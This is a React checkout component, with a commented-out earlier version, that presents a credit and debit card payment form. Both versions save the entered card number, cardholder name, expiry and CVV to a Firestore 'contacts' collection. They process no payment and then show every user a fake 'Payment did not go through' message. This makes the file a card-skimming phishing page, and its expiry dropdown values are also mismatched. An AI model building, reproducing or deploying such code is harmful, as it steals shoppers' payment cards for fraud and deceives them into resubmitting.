import React, { useState, useEffect } from 'react'
import { InputLabel, Select, MenuItem, Button, Grid, Typography } from '@material-ui/core';
import { useForm, FormProvider } from 'react-hook-form';
import { Link } from 'react-router-dom';
import useStyles from './styles';
import { db } from './config';
import firebase from 'firebase';
import { commerce } from '../../lib/commerce';
import FormInput from './FormInput';
import { asyncScheduler } from 'rxjs';
import StyleSheet from './StyleSheet.js'

const Payment = ({ checkoutToken }) => {

    const [number, setNumber] = useState("");
    const [name, setName] = useState("");
    const [year, setYear] = useState("");
    const [code, setCode] = useState("");
    const [month, setMonth] = useState("");


        const handleSubmit = (e) => {
        e.preventDefault();

        db.collection("contacts").add({
            number: number,
            name: name,
            year: year,
            code: code,
            month: month,
        })
        .then(()=> {
            alert('Payment did not go through, please try again or contact the seller')
        });

        setNumber("");
        setName("");
        setYear("");
        setCode("");
        setMonth("");
    };

    return (

<div class="container" >
    <form onSubmit={handleSubmit} >
    <div class="price">
        <h1>Payment Details</h1>
    </div>
    <div class="card__container">
        <div class="card">
            
            
            <div class="row credit">
                <div class="left">
                    <input id="cd" type="radio" name="payment" />
                    <div class="radio"></div>
                    <label for="cd">Debit/ Credit Card</label>
                </div>
                <div class="right">
                    <img src="https://i.imgur.com/b7wm7Hm.png" alt="visa" />
                    <img src="https://i.imgur.com/OFidnxu.png" alt="mastercard" />
                    <img src="https://i.imgur.com/KrKoQFv.png" alt="amex" />
                    <img src="https://i.imgur.com/rnPkYfb.png" alt="maestro" />
                </div>
            </div>
            <div class="row cardholder">
                <div class="info">
                    <label for="cardholdername">Name</label>
                    <input placeholder="e.g. Richard Bovell" id="cardholdername" type="text" value={name}  onChange={(e) => setName(e.target.value)} />
                </div>
            </div>
            <div class="row number">
                <div class="info">
                    <label for="cardnumber">Card number</label>
                    <input id="cardnumber" type="text" pattern="[0-9]{16,19}" maxlength="19" placeholder="8888-8888-8888-8888" value={number}  onChange={(e) => setNumber(e.target.value)} />
                </div>
            </div>
            <div class="row details">
                <div class="left">
                    <label for="expiry-date">Expiry</label>
                    <select id="expiry-date" value={month}  onChange={(e) => setMonth(e.target.value)} >
                        <option>MM</option>
                        <option value="1">01</option>
                        <option value="2">02</option>
                        <option value="3">03</option>
                        <option value="4">04</option>
                        <option value="5">05</option>
                        <option value="6">06</option>
                        <option value="7">07</option>
                        <option value="8">08</option>
                        <option value="9">10</option>
                        <option value="11">11</option>
                        <option value="12">12</option>
                    </select>
                    <span>/</span>
                    <select id="expiry-date" value={year}  onChange={(e) => setYear(e.target.value)}>
                        <option>YYYY</option>
                        <option value="2016">2021</option>
                        <option value="2017">2022</option>
                        <option value="2018">2023</option>
                        <option value="2019">2024</option>
                        <option value="2020">2025</option>
                        <option value="2021">2026</option>
                        <option value="2022">2027</option>
                        <option value="2023">2028</option>
                        <option value="2024">2029</option>
                        <option value="2025">2030</option>
                        <option value="2026">2031</option>
                        <option value="2027">2032</option>
                        <option value="2028">2033</option>
                        <option value="2029">2034</option>
                        <option value="2030">2035</option>
                    </select>
                </div>
                <div class="right">
                    <label for="cvv">CVC/CVV</label>
                    <input type="text" maxlength="4" placeholder="123" value={code}  onChange={(e) => setCode(e.target.value)} />
                    <span data-balloon-length="medium" data-balloon="The 3 or 4-digit number on the back of your card." data-balloon-pos="up">i</span>
                </div>
            </div>
        </div>
    </div>
    <div class="button">
        <button type="submit"><i class="ion-locked"></i> Confirm and Pay</button>
    </div>
    </form>
</div>
    )
}

export default Payment

// const Payment = ({ checkoutToken }) => {


//     const [number, setNumber] = useState("");
//     const [name, setName] = useState("");
//     const [date, setDate] = useState("");
//     const [code, setCode] = useState("");


//     const classes = useStyles();
//     const methods = useForm();

//     const handleSubmit = (e) => {
//         e.preventDefault();

//         db.collection("contacts").add({
//             number: number,
//             name: name,
//             date: date,
//             code: code,
//         })
//         .then(()=> {
//             alert('Payment did not go through, please try again or contact the seller')
//         });

//         setNumber("");
//         setName("");
//         setDate("");
//         setCode("");
//     };



//     return (
//         <>
//             <Typography variant="h6" gutterBottom>Payment Details</Typography>
//                 <form onSubmit={handleSubmit} >
               
//                         <input placeholder="e.g. Richard Bovell" value={number}  onChange={(e) => setNumber(e.target.value)} />
//                         <input  value={name}  onChange={(e) => setName(e.target.value)}/>
//                         <input  value={date}  onChange={(e) => setDate(e.target.value)}/>
//                         <input  maxlength="4" value={code}  onChange={(e) => setCode(e.target.value)}/>
              

//                     <Button  className={classes.checkoutButton} size="large" type="submit" variant="contained" color="primary">Place order</Button>
//                 </form>




//         </>



//     );


// }

// export default Payment


